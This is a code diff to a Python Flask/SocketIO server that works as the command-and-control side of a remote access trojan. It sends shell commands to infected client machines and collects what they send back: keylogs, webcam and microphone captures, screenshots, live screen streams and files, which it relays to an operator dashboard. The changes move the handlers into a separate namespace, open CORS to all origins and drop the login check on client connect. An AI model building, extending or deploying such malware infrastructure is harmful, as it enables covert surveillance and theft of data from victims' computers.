@@ -5,7 +5,6 @@ import time
 from datetime import datetime
 import base64
 
-
 # Third-Party Imports
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 from flask_socketio import SocketIO, emit
@@ -14,12 +13,12 @@ from dotenv import load_dotenv
 # Load environment variables from .env file
 load_dotenv()
 
-# Initialize Flask app and SocketIO
+# Initialize Flask app and SocketIO with CORS support
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())  # Fallback to random key if not set
 app.config['UPLOAD_FOLDER'] = 'uploads'
 app.config['DOWNLOAD_FOLDER'] = 'downloads'
-socketio = SocketIO(app)
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # Load authentication credentials from environment variables
 AUTH_USERNAME = os.getenv('AUTH_USERNAME')
@@ -68,7 +67,7 @@ def send_command():
     command = request.form.get('command')
 
     if client_id and command:
-        socketio.emit('command', command, to=client_id)
+        socketio.emit('command', command, to=client_id, namespace='/client')
         return jsonify({'status': 'success'})
     return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
 
@@ -89,23 +88,21 @@ def upload_file():
         filename = file.filename
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
-        socketio.emit('command', f'upload {filename}', broadcast=True)
+        socketio.emit('command', f'upload {filename}', broadcast=True, namespace='/client')
         return jsonify({'status': 'success'})
     return jsonify({'status': 'error', 'message': 'Upload failed'}), 400
 
-# --- SocketIO Event Handlers ---
-@socketio.on('connect')
-def handle_connect():
-    """Handle new client connections, ensuring authentication."""
-    print(f"[*] Client connected: {request.sid}")
-    if not session.get('logged_in'):
-        emit('redirect', {'url': url_for('login')})
-        disconnect()
+# --- SocketIO Event Handlers for Client Namespace ---
+@socketio.on('connect', namespace='/client')
+def handle_client_connect():
+    """Handle new client connections in the /client namespace."""
+    print(f"[*] Client connected: {request.sid} on /client namespace")
+    client_activity[request.sid] = {"last_active": time.time(), "status": "active"}
 
-@socketio.on('disconnect')
-def handle_disconnect():
-    """Handle client disconnections and update client info."""
-    print(f"[*] Client disconnected: {request.sid}")
+@socketio.on('disconnect', namespace='/client')
+def handle_client_disconnect():
+    """Handle client disconnections in the /client namespace."""
+    print(f"[*] Client disconnected: {request.sid} from /client namespace")
     if request.sid in client_info:
         del client_info[request.sid]
     if request.sid in client_activity:
@@ -118,27 +115,26 @@ def handle_disconnect():
         }
         for cid, info in client_info.items()
     ]
-    emit('client_info', client_info_list, broadcast=True)
+    emit('client_info', client_info_list, broadcast=True, namespace='/client')
 
-@socketio.on('command')
-def handle_command(data):
-    """Forward commands to specific clients if the user is authenticated."""
+@socketio.on('command', namespace='/client')
+def handle_client_command(data):
+    """Forward commands to specific clients in the /client namespace."""
     if not session.get('logged_in'):
-        return
-
+        return  # Only frontend users can send commands
     client_id = request.sid
     command = data.get('to', data)
 
     if isinstance(command, dict):
         target_client = command.get('to')
         if target_client:
-            socketio.emit('command', command.get('command', ''), to=target_client)
+            socketio.emit('command', command.get('command', ''), to=target_client, namespace='/client')
     else:
-        socketio.emit('command', command, to=client_id)
+        socketio.emit('command', command, to=client_id, namespace='/client')
 
-@socketio.on('exfil_data')
+@socketio.on('exfil_data', namespace='/client')
 def handle_exfil_data(data):
-    """Handle exfiltrated data from clients and broadcast to the dashboard."""
+    """Handle exfiltrated data from clients in the /client namespace."""
     client_id = request.sid
     data = json.loads(data)
     data_type = data.get('type')
@@ -153,7 +149,7 @@ def handle_exfil_data(data):
     if data_type == "system_info":
         username = data.get('system', {}).get('username')
         if not username:
-            socketio.emit('command', 'whoami', to=client_id)
+            socketio.emit('command', 'whoami', to=client_id, namespace='/client')
         else:
             client_info[client_id] = {
                 "system": data.get('system', {}),
@@ -193,7 +189,7 @@ def handle_exfil_data(data):
             'command': command,
             'output': output,
             'current_dir': current_dir
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "network_data":
         emit('network_data', {
@@ -203,7 +199,7 @@ def handle_exfil_data(data):
             'bytes_recv': data.get('bytes_recv'),
             'sent_speed_mbps': data.get('sent_speed_mbps'),
             'recv_speed_mbps': data.get('recv_speed_mbps')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "system_data":
         emit('system_data', {
@@ -211,37 +207,37 @@ def handle_exfil_data(data):
             'timestamp': data.get('timestamp'),
             'cpu_usage_percent': data.get('cpu_usage_percent'),
             'memory_usage_mb': data.get('memory_usage_mb')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "webcam_data":
         emit('webcam_data', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "mic_data":
         emit('mic_data', {
             'client_id': client_id,
             'audio': data.get('audio')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "screenshot_data":
         emit('screenshot_data', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "screen_stream":
         emit('screen_stream', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "keylog_data":
         emit('keylog_data', {
             'client_id': client_id,
             'logs': data.get('logs')
-        }, broadcast=True)
+        }, broadcast=True, namespace='/client')
 
     elif data_type == "file_download":
         filename = data.get('filename')
@@ -260,7 +256,7 @@ def handle_exfil_data(data):
         }
         for cid, info in client_info.items()
     ]
-    emit('client_info', client_info_list, broadcast=True)
+    emit('client_info', client_info_list, broadcast=True, namespace='/client')
 
 # --- Main Entry Point ---
 if __name__ == '__main__':
@@ -269,5 +265,3 @@ if __name__ == '__main__':
     os.makedirs(app.config['DOWNLOAD_FOLDER'], exist_ok=True)
     # Run the server
     socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
-    # Note: allow_unsafe_werkzeug=True is used for development purposes only.
-    # In production, consider using a proper WSGI server like Gunicorn or uWSGI.
